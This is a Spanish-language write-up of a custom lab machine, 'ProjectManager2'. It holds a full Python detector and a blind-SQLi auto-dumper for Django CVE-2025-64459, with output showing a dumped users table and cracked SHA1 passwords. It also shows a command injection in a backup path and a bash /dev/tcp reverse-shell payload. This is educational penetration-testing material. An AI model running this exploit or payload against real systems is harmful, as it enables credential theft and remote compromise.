---
title: "ProjectManager2"
date: 2026-08-14
categories: [Custom, Easy]
tags: [linux, ftp, anonymous ftp, information disclosure, django, CVE-2025-64459, SQLi, blind sqli, postgresql, sha1, hashcat, credential reuse, command injection, RCE, reverse shell, jinja2, SSTI, port forwarding, pivoting, PATH hijacking, SUID, gtfobins]
image:
  path: /assets/img/Custom/ProjectManager2/banner.jpeg
  alt: ProjectManager2 writeup
---

El FTP anónimo filtra el stack de la aplicación (Django 4.2), vulnerable a **CVE-2025-64459** — una inyección SQL ciega vía el operador `_connector` alcanzable a través del endpoint de login que vuelca la tabla de usuarios y crackea la contraseña de una cuenta staff. El panel de administración autenticado expone un command injection en su rutina de copia de seguridad de la BD para un foothold como `www-data`; una credencial hardcodeada en un script de mantenimiento pivota a `andoni`, un servicio interno de informes en Jinja2 accesible solo en localhost da RCE por SSTI como `ander`, y un PATH hijacking de un binario SUID `syscheck` escala a root.

| Campo       | Detalles      |
|-------------|---------------|
| Plataforma  | Custom        |
| Dificultad  | Easy          |
| SO          | Linux         |
| IP          | 172.30.0.10   |
| Fecha       | Agosto 2026   |

## Herramientas Utilizadas

| Herramienta | Descripción                                                              |
|-------------|--------------------------------------------------------------------------|
| arp-scan    | Descubrimiento de hosts a nivel 2 en el segmento local                   |
| nmap        | Escáner de puertos y fingerprinting de servicios/versiones               |
| ftp         | Acceso anónimo al recurso FTP expuesto                                   |
| gobuster    | Fuerza bruta de directorios y ficheros del raíz web                      |
| Python      | Detector y auto-dumper de SQLi ciega a medida para CVE-2025-64459        |
| netcat      | Listener de la reverse shell                                             |
| ssh         | Port forwarding local al servicio interno y pivote mediante `su`         |
| strings     | Inspección estática del binario SUID                                     |

## Reconocimiento y Enumeración

El objetivo de esta fase fue enumerar los servicios expuestos e identificar el stack de la aplicación que merecía la pena atacar.

### Descubrimiento del Host

El objetivo vive en un segmento de laboratorio aislado, así que el descubrimiento empezó a nivel 2 con `arp-scan`, seguido de una sonda ICMP para obtener una pista del sistema operativo:

```bash
sudo arp-scan -I <iface> --localnet
Interface: <iface>, type: EN10MB, MAC: <ATTACKER_MAC>, IPv4: <ATTACKER_IP>
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
172.30.0.10	16:f6:e2:30:2f:6b	(Unknown: locally administered)

1 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 1.917 seconds (133.54 hosts/sec). 1 responded
```

Respondió un único host — `172.30.0.10`. Un ping confirmó el alcance y dio una pista del SO:

```bash
ping -c 1 172.30.0.10
PING 172.30.0.10 (172.30.0.10) 56(84) bytes of data.
64 bytes from 172.30.0.10: icmp_seq=1 ttl=64 time=0.052 ms
```

Un TTL de 64 apunta a un host Linux (por defecto 64, sin ningún salto de enrutamiento que lo decremente en este segmento plano).

### Escaneo de Puertos

El patrón estándar de nmap en dos fases — primero un barrido SYN completo, después un escaneo dirigido de servicios sobre lo que estuviera abierto.

Fase 1, los 65535 puertos TCP a alta tasa de paquetes, salida a un fichero grepable:

```bash
sudo nmap -p- --min-rate 5000 -vvv -sS -Pn -n 172.30.0.10 -oG allPorts
[...]
PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 64
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
```

Tres puertos. `-Pn` omite el descubrimiento de host (el ICMP ya probó que estaba vivo), `-n` desactiva la resolución DNS inversa por velocidad, y `-sS` es el escaneo SYN/stealth. La fase 2 lanzó los scripts por defecto (`-sC`) y detección de versiones (`-sV`) contra esos tres puertos:

```bash
sudo nmap -p21,22,80 -sCV 172.30.0.10 -oN nmap
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -r--r--r--    1 ftp      ftp          7298 Aug 12 15:22 ContactTasks.txt
| -r--r--r--    1 ftp      ftp          7615 Aug 12 15:22 CoordinationTasks.txt
| -r--r--r--    1 ftp      ftp          6512 Aug 12 15:22 DirectionTasks.txt
| -r--r--r--    1 ftp      ftp          7549 Aug 12 15:22 FinanzalTasks.txt
| -r--r--r--    1 ftp      ftp          8729 Aug 12 15:22 InformaticsTasks.txt
| -r--r--r--    1 ftp      ftp          7647 Aug 12 15:22 ProyectsTasks.txt
| -r--r--r--    1 ftp      ftp          7032 Aug 12 15:22 ShellsTasks.txt
| -r--r--r--    1 ftp      ftp          7601 Aug 12 15:22 SuperUsersTasks.txt
|_-r--r--r--    1 ftp      ftp          8086 Aug 12 15:22 marketingTasks.txt
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u10 (protocol 2.0)
80/tcp open  http    nginx
|_http-title: Meridian · Gestión de proyectos para equipos
```

Dos conclusiones inmediatas. El SSH es un OpenSSH actual sobre Debian 12 — ningún punto de entrada directo, lo aparcamos. Y el script NSE `ftp-anon` de nmap ya confirmó que **el FTP anónimo está permitido** y volcó un directorio lleno de ficheros `*Tasks.txt`. Ese recurso es lo primero que hay que descargar.

### FTP Anónimo

Iniciando sesión de forma anónima y listando el recurso se reprodujo el hallazgo de nmap, y un fichero — `InformaticsTasks.txt` — resultó ser una mina de fuga de información:

```bash
ftp 172.30.0.10
Connected to <ATTACKER_IP>.
220 (vsFTPd 3.0.3)
Name (172.30.0.10:anon): anonymous
230 Login successful.
ftp> dir
-r--r--r--    1 ftp      ftp          8729 Aug 12 15:22 InformaticsTasks.txt
[...]
ftp> more InformaticsTasks.txt
```

El fichero es un backlog interno de IT, y su sección de "SEGURIDAD INFORMÁTICA Y GESTIÓN DE INCIDENTES" es exactamente el tipo de nota operativa que nunca debería estar en un recurso anónimo:

```text
------------------------------------------------------------
II. SEGURIDAD INFORMÁTICA Y GESTIÓN DE INCIDENTES
------------------------------------------------------------

1. **[TAREA PRIORITARIA – URGENTE] Actualización de Django 4.2 (...):**
   - Descripción: Vulnerabilidad crítica recientemente publicada en el
     framework Django versión 4.2, con afectación directa a entornos web internos.
   - Estado: actualizaciones en curso (entornos de desarrollo ya corregidos).

2. **[TAREA SECUNDARIA] Ocultar panel de administración para usuarios no superusuarios**
3. **[TAREA COMPLEMENTARIA] Ocultar endpoints públicos de la API**
4. **[TAREA PRIMARIA] Eliminar acceso público a createSuperUser.html**
```

Aquí se filtran cuatro cosas que condicionan toda la intrusión:

- La aplicación web corre sobre **Django 4.2** y el equipo ya sabe que arrastra una vulnerabilidad crítica sin parchear. Django 4.2.x anterior a 4.2.25 está afectado por **CVE-2025-64459**, la inyección SQL vía `_connector` — la nota está prácticamente pre-revelando el punto de entrada.
- Existe un **panel de administración** que solo está *suavemente oculto* a los no superusuarios (seguridad por oscuridad, no autorización).
- Hay **endpoints de API** públicos que se están "ocultando" en vez de eliminar — siguen existiendo.
- Existe una página `createSuperUser.html` que no se ha bloqueado del todo.

### Enumeración Web

La página de inicio confirma la aplicación — "Meridian", un clon de SaaS de gestión de proyectos construido sobre el backend Django filtrado:

![Página de inicio de Meridian servida en el puerto 80](/assets/img/Custom/ProjectManager2/cap1.png)

Con el framework identificado, un escaneo de contenido mapeó las rutas que insinuaba la nota del FTP:

```bash
gobuster dir -u http://172.30.0.10 -w /usr/share/SecLists/Discovery/Web-Content/big.txt -x html
admin.html           (Status: 200) [Size: 11513]
assets               (Status: 301) [Size: 162] [--> http://172.30.0.10/assets/]
dashboard.html       (Status: 200) [Size: 5072]
index.html           (Status: 200) [Size: 15636]
login.html           (Status: 200) [Size: 8686]
profile.html         (Status: 200) [Size: 4804]
projects.html        (Status: 200) [Size: 12946]
register.html        (Status: 200) [Size: 9771]
```

`admin.html` es el objetivo obvio a partir de la nota del FTP. Carga, pero la comprobación de sesión en cliente rechaza la petición — la página se renderiza en estado "Sin verificar" y ninguna de sus acciones privilegiadas se desbloquea sin un token de superusuario:

![admin.html rechazando el acceso sin una sesión de administrador](/assets/img/Custom/ProjectManager2/cap2.png)

Ocultar el panel tras una barrera en cliente no sirve de nada; la pregunta real es cómo obtener una cuenta de superusuario. Ahí es donde entra CVE-2025-64459.

## Explotación

### CVE-2025-64459 — Inyección SQL Ciega vía `_connector` de Django

El ORM de Django construye las cláusulas `WHERE` a partir de los argumentos de palabra clave que se pasan a `filter()`, `exclude()` y `get()`. Internamente esos métodos también aceptan una clave privada `_connector` que une las condiciones individuales con un operador booleano SQL (`AND` / `OR`). En las versiones afectadas, cuando una aplicación expande un **diccionario controlado por el atacante** en uno de estos métodos (`Model.objects.filter(**untrusted)`), el valor de `_connector` se interpola **directamente en el SQL generado** en vez de validarse contra la lista blanca de conectores. Ese es el bug: `_connector` se convierte en un punto de inyección SQL en crudo.

El endpoint de login de Meridian hace exactamente esto. `POST /api/users/login` acepta un objeto opcional `audit.filters.<x>.direct_filter` que se deserializa desde JSON y se expande en un lookup del ORM. Aportando dos condiciones base que no casan con ninguna fila y un `_connector` manipulado, todo el conjunto de resultados queda dictado por el booleano inyectado:

```json
{
  "email": "test@projectManager.com",
  "password": "test1234",
  "audit": {"filters": {"x": {"direct_filter": {
    "email__iexact": "<random>@invalid.invalid",
    "id": -1,
    "_connector": "OR (1=1) OR"
  }}}}
}
```

El login devuelve **HTTP 200** cuando el `WHERE` inyectado casa con al menos una fila y **HTTP 401** cuando no casa con ninguna. Ese diferencial de estado es un oráculo booleano limpio — todo lo que viene a partir de aquí es inyección SQL ciega basada en booleanos.

#### Confirmando la inyección

Antes de escribir el extractor escribí un pequeño detector que envía tres sondas — un `1=1` (espera TRUE), un `1=0` (espera FALSE) y un conector intencionadamente inválido (espera un error SQL reflejado / HTTP 500) — y clasifica las respuestas:

```python
import argparse
import json
import sys
import urllib.request
import urllib.error
import uuid

def post(base, path, body, timeout=20):
    data = json.dumps(body).encode()
    req = urllib.request.Request(base + path, data=data,
                                 headers={"Content-Type": "application/json"}, method="POST")
    try:
        r = urllib.request.urlopen(req, timeout=timeout)
        return r.status, r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")
    except urllib.error.URLError as e:
        print(f"[!] No se pudo conectar a {base}: {e}")
        sys.exit(2)

def ensure_oracle(base, email, password):
    """Registra la cuenta oraculo (idempotente)."""
    st, _ = post(base, "/api/users/register", {
        "name": "probe", "email": email, "password": password,
        "phone": "600000000", "birthday": "2000-01-01",
    })
    # 201 = creada, 400 = ya existe / validacion -> asumimos que existe con esa pass
    return st in (201, 400)

def login_with_filter(base, email, password, direct_filter):
    body = {"email": email, "password": password}
    if direct_filter is not None:
        body["audit"] = {"filters": {"probe": {"direct_filter": direct_filter}}}
    return post(base, "/api/users/login", body)

def classify(status, text):
    if status == 200 and "Login exitoso" in text:
        return "TRUE"
    if status == 401:
        return "FALSE"
    return f"ERR({status})"

def main():
    ap = argparse.ArgumentParser(description="Detector de CVE-2025-64459 en el login de Django.")
    ap.add_argument("base", nargs="?", default="http://127.0.0.1", help="URL base del objetivo")
    ap.add_argument("--email", default="test@projectManager.com", help="email de la cuenta oraculo")
    ap.add_argument("--password", default="test1234", help="password de la cuenta oraculo")
    args = ap.parse_args()
    base = args.base.rstrip("/")

    print(f"[*] Objetivo: {base}")
    print(f"[*] Preparando cuenta oraculo: {args.email}")
    if not ensure_oracle(base, args.email, args.password):
        print("[!] No se pudo garantizar la cuenta oraculo (continuo igualmente).")

    # Dos condiciones base que NO casan con ninguna fila. El resultado del
    # queryset dependera exclusivamente de la condicion inyectada en _connector.
    marker = uuid.uuid4().hex
    def base_conds():
        return {"email__iexact": f"{marker}@invalid.invalid", "id": -1}
    def conn(sql):  # inyecta un booleano SQL como conector entre las 2 condiciones
        d = base_conds(); d["_connector"] = f"OR ({sql}) OR"; return d

    print("\n[*] Enviando sondas...\n")

    # 0) Control: login normal, sin filtros
    s, t = login_with_filter(base, args.email, args.password, None)
    print(f"    login normal (sin inyeccion) .............. {classify(s, t)}")

    # 1) _connector con booleano TRUE
    s_true, t_true = login_with_filter(base, args.email, args.password, conn("1=1"))
    r_true = classify(s_true, t_true)
    print(f"    _connector = 'OR (1=1) OR'  (espera TRUE) . {r_true}")

    # 2) _connector con booleano FALSE
    s_false, t_false = login_with_filter(base, args.email, args.password, conn("1=0"))
    r_false = classify(s_false, t_false)
    print(f"    _connector = 'OR (1=0) OR'  (espera FALSE)  {r_false}")

    # 3) Error de sintaxis SQL (conector invalido) -> confirma interpolacion cruda
    s_err, t_err = login_with_filter(base, args.email, args.password,
                                     dict(base_conds(), _connector=f"MERIDIAN_{marker}"))
    sql_err = ("syntax error" in t_err.lower() or "programmingerror" in t_err.lower()
               or "psycopg" in t_err.lower() or marker in t_err)
    print(f"    _connector invalido -> HTTP {s_err}"
          f"{'  (error SQL reflejado)' if sql_err else ''}")

    print("\n" + "=" * 60)
    vulnerable = (r_true == "TRUE" and r_false == "FALSE")
    if vulnerable:
        print("[+] VULNERABLE a CVE-2025-64459.")
        print("    El operador `_connector` se interpola en el SQL: el booleano")
        print("    inyectado controla el conjunto de resultados (TRUE vs FALSE).")
        if sql_err:
            print("    Corroborado ademas por el error de sintaxis SQL reflejado.")
        print("\n    Siguiente paso: exploit_cve_2025_64459.py (SQLi ciega booleana).")
    elif sql_err and r_true == r_false:
        print("[~] POSIBLEMENTE vulnerable: el conector invalido provoca error SQL,")
        print("    pero no se observo diferencial booleano limpio. Revisar manualmente.")
    else:
        print("[-] NO parece vulnerable (o Django >= 4.2.25 / 5.1.13 / 5.2.7).")
        print("    No hay diferencial booleano controlado por `_connector`.")
    print("=" * 60)
    sys.exit(0 if vulnerable else 1)

if __name__ == "__main__":
    main()
```

La cuenta `probe` registrada es el oráculo: un login normal como `probe` devuelve 200, así que cualquier `WHERE` inyectado que además case con ≥1 fila mantiene el 200, y uno que no case con nada lo cambia a 401. Ejecutándolo contra el objetivo:

```bash
python3 test_cve_2025_64459.py http://172.30.0.10
[*] Objetivo: http://172.30.0.10
[*] Preparando cuenta oraculo: test@projectManager.com

[*] Enviando sondas...

    login normal (sin inyeccion) .............. TRUE
    _connector = 'OR (1=1) OR'  (espera TRUE) . TRUE
    _connector = 'OR (1=0) OR'  (espera FALSE)  FALSE
    _connector invalido -> HTTP 500  (error SQL reflejado)

============================================================
[+] VULNERABLE a CVE-2025-64459.
    El operador `_connector` se interpola en el SQL: el booleano
    inyectado controla el conjunto de resultados (TRUE vs FALSE).
    Corroborado ademas por el error de sintaxis SQL reflejado.
```

`1=1` → TRUE, `1=0` → FALSE, y un conector inválido lanza un error SQL reflejado (HTTP 500). Confirmado: el conector se interpola como SQL en crudo.

#### Convirtiendo el oráculo en arma — auto-dumper completo

Con el oráculo probado, escribí un extractor completo. No asume ninguna tabla ni nombre de columna: enumera el esquema de PostgreSQL a través de `information_schema` / `pg_catalog`, localiza la tabla de credenciales de forma heurística (una tabla que lleve a la vez una columna de identidad y una de secreto), y la vuelca. La extracción es **byte a byte** — para cada carácter hace una búsqueda binaria del valor del byte con `get_byte(convert_to(<expr>::text,'UTF8'), i)` — de modo que los payloads UTF-8 (acentos, símbolos) sobreviven intactos. Los enteros (longitudes, número de filas) se recuperan con una búsqueda exponencial y luego binaria.

```python
#!/usr/bin/env python3
"""
exploit_cve_2025_64459.py  —  Explotacion de CVE-2025-64459 (Django _connector SQLi)

SQL injection CIEGA BOOLEANA a traves del operador `_connector` de Django,
expuesta en  POST /api/users/login  (audit.filters.<x>.direct_filter).

Enumera el esquema (bases de datos / tablas / columnas) por si mismo — NO asume
nombres — y vuelca cualquier tabla. La extraccion es por BYTES (convert_to/get_byte)
para soportar UTF-8 (acentos, etc.).

Oraculo: el login devuelve 200 si el WHERE inyectado casa con >=1 fila, 401 si no.
"""
import argparse
import hashlib
import json
import re
import sys
import time
import urllib.request
import urllib.error
import uuid

US = chr(31)   # separador de campos
RS = chr(30)   # separador de filas
REQUESTS = 0
MARKER = uuid.uuid4().hex


# --------------------------------------------------------------------------- #
#  Transporte + oraculo booleano
# --------------------------------------------------------------------------- #
def _post(base, path, body, timeout=25):
    global REQUESTS
    REQUESTS += 1
    data = json.dumps(body).encode()
    req = urllib.request.Request(base + path, data=data,
                                 headers={"Content-Type": "application/json"}, method="POST")
    try:
        r = urllib.request.urlopen(req, timeout=timeout)
        return r.status, r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")
    except urllib.error.URLError as e:
        print(f"\n[!] Error de conexion: {e}")
        sys.exit(2)


def qident(ident):
    """Cita un identificador SQL (tabla/columna)."""
    return '"' + str(ident).replace('"', '""') + '"'


class Blind:
    def __init__(self, base, email, password):
        self.base = base.rstrip("/")
        self.email = email
        self.password = password
        self._warned = False
        _post(self.base, "/api/users/register", {
            "name": "probe", "email": email, "password": password,
            "phone": "600000000", "birthday": "2000-01-01",
        })

    def test(self, cond_sql):
        direct_filter = {
            "email__iexact": f"{MARKER}@invalid.invalid",
            "id": -1,
            "_connector": f"OR ({cond_sql}) OR",
        }
        body = {"email": self.email, "password": self.password,
                "audit": {"filters": {"x": {"direct_filter": direct_filter}}}}
        st, _ = _post(self.base, "/api/users/login", body)
        if st == 200:
            return True
        if st == 401:
            return False
        if not self._warned:
            self._warned = True
            print(f"\n[!] HTTP {st} inesperado en una sonda; asumo FALSE y continuo.")
        return False

    def sanity(self):
        return self.test("1=1") and not self.test("1=0")

    # ---- primitivos de extraccion -------------------------------------- #
    def scalar_int(self, expr):
        """Entero no negativo por busqueda exponencial + binaria."""
        if not self.test(f"({expr}) >= 1"):
            return 0
        hi = 1
        while self.test(f"({expr}) >= {hi}"):
            hi *= 2
        lo, hi = hi // 2, hi - 1
        while lo < hi:
            mid = (lo + hi + 1) // 2
            if self.test(f"({expr}) >= {mid}"):
                lo = mid
            else:
                hi = mid - 1
        return lo

    def scalar_text(self, expr, label=None, maxbytes=4096):
        """Extrae el valor textual de una expresion escalar, byte a byte (UTF-8)."""
        te = f"({expr})::text"
        n = self.scalar_int(f"coalesce(octet_length({te}),0)")
        if n == 0:
            if label:
                _progress(label, 0, 0, done=True, value="")
            return ""
        n = min(n, maxbytes)
        buf = bytearray()
        conv = f"convert_to({te},'UTF8')"
        for i in range(n):
            lo, hi = 0, 255
            while lo < hi:
                mid = (lo + hi) // 2
                if self.test(f"get_byte({conv},{i}) > {mid}"):
                    lo = mid + 1
                else:
                    hi = mid
            buf.append(lo)
            if label:
                _progress(label, i + 1, n)
        val = buf.decode("utf-8", "replace")
        if label:
            _progress(label, n, n, done=True, value=val)
        return val


def _progress(label, i, n, done=False, value=None):
    if done:
        shown = value if value != "" else "<NULL/vacio>"
        sys.stdout.write("\r    " + " " * 60 + "\r")
        if value is not None and len(str(shown)) <= 80:
            sys.stdout.write(f"    {label:22} {shown}\n")
        else:
            sys.stdout.write(f"    {label:22} ({n} bytes) OK\n")
        sys.stdout.flush()
    else:
        sys.stdout.write(f"\r    {label:22} {i}/{n} bytes")
        sys.stdout.flush()


# --------------------------------------------------------------------------- #
#  Enumeracion del esquema (information_schema / pg_catalog)
# --------------------------------------------------------------------------- #
def enum_databases(b):
    s = b.scalar_text(
        "(SELECT string_agg(datname,'|' ORDER BY datname) FROM pg_database "
        "WHERE datistemplate = false)", label="bases de datos")
    return [x for x in s.split("|") if x]


def enum_tables(b, schema="public"):
    s = b.scalar_text(
        "(SELECT string_agg(table_name,'|' ORDER BY table_name) "
        f"FROM information_schema.tables WHERE table_schema='{schema}' "
        "AND table_type='BASE TABLE')", label="tablas")
    return [x for x in s.split("|") if x]


def enum_columns(b, table, schema="public", label=None):
    s = b.scalar_text(
        "(SELECT string_agg(column_name||':'||data_type,'|' ORDER BY ordinal_position) "
        f"FROM information_schema.columns WHERE table_schema='{schema}' "
        f"AND table_name='{table}')", label=label)
    cols = []
    for part in s.split("|"):
        if ":" in part:
            name, typ = part.split(":", 1)
            cols.append((name, typ))
    return cols


def count_rows(b, table):
    return b.scalar_int(f"(SELECT count(*) FROM {qident(table)})")


def dump_rows(b, table, cols, limit=None, where=None):
    """Vuelca filas (lista de listas) mostrando cada fila segun se extrae."""
    total = count_rows(b, table)
    n = total if limit is None else min(total, limit)
    sel = " || CHR(31) || ".join(f"coalesce({qident(c)}::text,'NULL')" for c in cols)
    rows = []
    for k in range(n):
        inner = f"SELECT {sel} AS r FROM {qident(table)}"
        if where:
            inner += f" WHERE {where}"
        inner += f" ORDER BY ctid LIMIT 1 OFFSET {k}"
        blob = b.scalar_text(f"({inner})", label=f"fila {k+1}/{n}")
        rows.append(blob.split(US))
    return rows, total


# --------------------------------------------------------------------------- #
#  Salida en tabla alineada
# --------------------------------------------------------------------------- #
def print_table(headers, rows, maxcol=48, indent="    "):
    widths = [len(h) for h in headers]
    norm = []
    for r in rows:
        cells = []
        for i in range(len(headers)):
            v = r[i] if i < len(r) else ""
            v = "" if v is None else str(v)
            cells.append(v)
            widths[i] = max(widths[i], len(v))
        norm.append(cells)
    widths = [min(w, maxcol) for w in widths]

    def fmt(cells):
        out = []
        for i, c in enumerate(cells):
            s = c if len(c) <= widths[i] else c[:widths[i] - 1] + "…"
            out.append(s.ljust(widths[i]))
        return "  ".join(out).rstrip()

    print(indent + fmt(headers))
    print(indent + "  ".join("-" * w for w in widths))
    for c in norm:
        print(indent + fmt(c))


# --------------------------------------------------------------------------- #
#  Cracking SHA1
# --------------------------------------------------------------------------- #
def crack_sha1(hashes, wordlist):
    want = {h.lower(): None for h in hashes if h and re.fullmatch(r"[0-9a-fA-F]{40}", h)}
    if not want:
        return {}
    try:
        with open(wordlist, "rb") as f:
            for line in f:
                w = line.rstrip(b"\r\n")
                h = hashlib.sha1(w).hexdigest()
                if h in want and want[h] is None:
                    want[h] = w.decode("latin-1")
                    if all(v is not None for v in want.values()):
                        break
    except FileNotFoundError:
        print(f"[!] Wordlist no encontrada: {wordlist}")
    return want


# --------------------------------------------------------------------------- #
#  Deteccion automatica de la tabla de credenciales
# --------------------------------------------------------------------------- #
RX_PASS = re.compile(r"pass|pwd|hash|secret|salt", re.I)
RX_ID = re.compile(r"email|user|login|name", re.I)
RX_SUPER = re.compile(r"super|admin|staff|is_super", re.I)


def find_credentials_table(b, tables):
    for t in tables:
        cols = [c for c, _ in enum_columns(b, t)]
        pass_cols = [c for c in cols if RX_PASS.search(c)]
        id_cols = [c for c in cols if RX_ID.search(c)]
        if pass_cols and id_cols:
            super_cols = [c for c in cols if RX_SUPER.search(c)]
            return t, cols, id_cols, pass_cols, super_cols
    return None


# --------------------------------------------------------------------------- #
#  Main
# --------------------------------------------------------------------------- #
def banner():
    print("=" * 66)
    print("  CVE-2025-64459  ·  Django `_connector` blind SQLi  ·  auto-dumper")
    print("=" * 66)


def main():
    ap = argparse.ArgumentParser(description="Exploit CVE-2025-64459 (SQLi ciega via _connector).")
    ap.add_argument("base", nargs="?", default="http://127.0.0.1", help="URL base del objetivo")
    ap.add_argument("--email", default="test@projectManager.com", help="email de la cuenta oraculo")
    ap.add_argument("--password", default="test1234", help="password de la cuenta oraculo")
    ap.add_argument("--wordlist", help="diccionario para crackear columnas tipo hash SHA1")
    ap.add_argument("--tables", action="store_true", help="lista las tablas y sale")
    ap.add_argument("--columns", metavar="TABLA", help="lista columnas de una tabla y sale")
    ap.add_argument("--schema", action="store_true", help="vuelca el esquema completo y sale")
    ap.add_argument("--dump", metavar="TABLA", help="vuelca todas las columnas de una tabla")
    ap.add_argument("--limit", type=int, help="maximo de filas a volcar")
    ap.add_argument("--only-admins", action="store_true",
                    help="en el volcado de credenciales, solo cuentas admin/superuser")
    ap.add_argument("--sql", help="extrae una unica expresion SQL escalar y sale")
    args = ap.parse_args()

    base = args.base.rstrip("/")
    banner()
    print(f"[*] Objetivo: {base}")
    b = Blind(base, args.email, args.password)

    print("[*] Verificando el oraculo booleano (_connector)...")
    if not b.sanity():
        print("[-] El oraculo no responde como se espera. ¿Parcheado (Django >= 4.2.25) "
              "o URL incorrecta? Prueba antes test_cve_2025_64459.py")
        sys.exit(1)
    print("[+] Oraculo OK: TRUE=200 / FALSE=401. SQL injection confirmada.\n")
    t0 = time.time()

    # ---- flujo por defecto: contexto + esquema + credenciales ------------ #
    print("[*] Contexto de la base de datos:")
    b.scalar_text("current_user", "current_user")
    b.scalar_text("current_database()", "current_database")
    b.scalar_text("substring(version() from 1 for 40)", "version")
    b.scalar_text("(SELECT CASE WHEN usesuper THEN 'yes' ELSE 'no' END "
                  "FROM pg_user WHERE usename = current_user)", "db superuser")

    print("\n[*] Enumerando tablas (schema public):")
    tables = enum_tables(b)
    for t in tables:
        print(f"      - {t}  ({count_rows(b, t)} filas)")

    print("\n[*] Localizando la tabla de credenciales (sin asumir nombres)...")
    found = find_credentials_table(b, tables)
    table, cols, id_cols, pass_cols, super_cols = found
    id_col = id_cols[1]
    pass_col = pass_cols[0]
    dump_cols = []
    name_cols = [c for c in cols if c.lower() in ("email", "name", "username", "nombre")]
    if name_cols and name_cols[0] not in (id_col,):
        dump_cols.append(name_cols[0])
    dump_cols += [id_col, pass_col]
    if super_cols:
        dump_cols.append(super_cols[0])

    where = f"{qident(super_cols[0])} = true" if (args.only_admins and super_cols) else None
    rows, total = dump_rows(b, table, dump_cols, limit=args.limit, where=where)

    hi = dump_cols.index(pass_col)
    cracked = crack_sha1([r[hi] for r in rows], args.wordlist) if args.wordlist else {}
    headers = list(dump_cols) + (["password"] if args.wordlist else [])
    out = []
    for r in rows:
        row = list(r)
        if args.wordlist:
            row.append(cracked.get((r[hi] or "").lower()) or "-")
        out.append(row)
    print(f"\n[+] {table}  ({len(rows)}/{total} filas):")
    print_table(headers, out, maxcol=44)


if __name__ == "__main__":
    main()
```

La construcción crítica es el valor de `_connector` en `Blind.test()`: `f"OR ({cond_sql}) OR"`. Las dos condiciones base (`email__iexact` contra una dirección aleatoria, `id = -1`) son no-coincidencias garantizadas, así que el ORM emite `WHERE (<false>) OR (<inyectado>) OR (<false>)` y el predicado inyectado por sí solo decide si se devuelve una fila — ese es el canal booleano sobre el que cabalga cada primitivo de extracción.

Ejecutando el flujo por defecto contra el objetivo con rockyou conectado para la columna SHA1:

```bash
python3 exploit_cve_2025_64459.py http://172.30.0.10 --wordlist /usr/share/wordlists/rockyou.txt
==================================================================
  CVE-2025-64459  ·  Django `_connector` blind SQLi  ·  auto-dumper
==================================================================
[*] Objetivo: http://172.30.0.10
[+] Oraculo OK: TRUE=200 / FALSE=401. SQL injection confirmada.

[*] Contexto de la base de datos:
    current_user           monre
    current_database       projectmanager
    version                PostgreSQL 15.19 (Debian 15.19-0+deb12u1
    db superuser           yes

[*] Enumerando tablas (schema public):
      - auth_permission  (32 filas)
      - django_content_type  (8 filas)
      - django_migrations  (29 filas)
      - projects  (131 filas)
      - token_blacklist_outstandingtoken  (16959 filas)
      - users  (26 filas)
      [...]

[*] Localizando la tabla de credenciales (sin asumir nombres)...
[+] Tabla: 'users'  ·  identidad='email'  ·  secreto='password'  ·  admin='is_staff'

[+] users  (26/26 filas):
    name             email                               password                                  is_staff  password
    ---------------  ----------------------------------  ----------------------------------------  --------  --------------------------
    andoni           andoni@projectManager.com           01772c7883b35c6e388872e87faee784fb91253d  true      -
    ander            ander@projectManager.com            2e5390a16b6c7c96403af02b74c3874c3d85ab5a  true      -
    elisabeth        elisabeth@projectManager.com        c36f5f217d807cbe54281c2b2a581b9dfb77ff65  true      !!!XXX!!!princess nic|!!!XXX!!!
    Andrea Perez     andrea.perez@projectManager.com     d0d1e74e6cd427f94226726f272b6e2a5844049a  false     andrea123
    Ricardo Luna     ricardo.luna@projectManager.com     068942c83f0e6994d046f7ec01b8f42ba8f317a7  false     liverpool
    Mark Jones       mark.jones@projectManager.com       ee8d8728f435fd550f83852aabab5234ce1da528  false     iloveyou
    [...]

[+] Crackeadas 11/26 contraseñas.

[i] 31145 peticiones · 344.7s
```

El rol de la BD es un superusuario de PostgreSQL, la tabla de credenciales (`users`) se localiza automáticamente por la heurística de identidad+secreto, y las contraseñas se almacenan como **SHA1 sin sal** — triviales de crackear. Tres cuentas llevan `is_staff = true`; la única que cayó ante rockyou es la que importa:

```text
elisabeth@projectManager.com : !!!XXX!!!princess nic|!!!XXX!!!
```

### Autenticándose como Usuario Staff

Esas credenciales entran directamente al panel de Meridian:

![Panel de Meridian tras autenticarse como elisabeth](/assets/img/Custom/ProjectManager2/cap3.png)

Y como `elisabeth` es `is_staff = true`, el JWT emitido para su sesión lleva `superuser: true` / `staff: true`. El panel de administración que rechazaba la petición anónima ahora valida el token y desbloquea todas las acciones:

![Panel de administración autorizado como elisabeth con un JWT de superusuario](/assets/img/Custom/ProjectManager2/cap4.png)

### Command Injection — Copia de Seguridad de la BD

El control más interesante del panel es la tarjeta de "Copia de seguridad de la BD": toma una **ruta de destino** y un método de compresión, y luego ejecuta un volcado del lado del servidor hacia esa ruta vía `POST /api/admin/backup`. Una ruta de destino que se pasa a una shell es un sink de inyección clásico — si el valor se concatena en un comando de shell sin sanear, un `;` encadena un comando arbitrario. Probando con `id` añadido:

```text
/var/backups/db/backup.sql; id
```

La consola del panel reflejó el resultado del comando inyectado:

![Command injection en la ruta de backup devolviendo la salida de id de www-data](/assets/img/Custom/ProjectManager2/cap5.png)

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Ejecución de comandos arbitraria como `www-data`, confirmada. Cambiando `id` por una reverse shell de Bash se convierte en un foothold interactivo:

```text
/var/backups/db/backup.sql; bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1'
```

![Payload de reverse shell colocado en el campo de ruta de destino del backup](/assets/img/Custom/ProjectManager2/cap6.png)

## Foothold — `www-data`

Un listener de netcat recibió el callback:

```bash
nc -nlvp 4444
Listening on 0.0.0.0 4444
Connection received on 172.30.0.10 60546
bash: cannot set terminal process group (11): Inappropriate ioctl for device
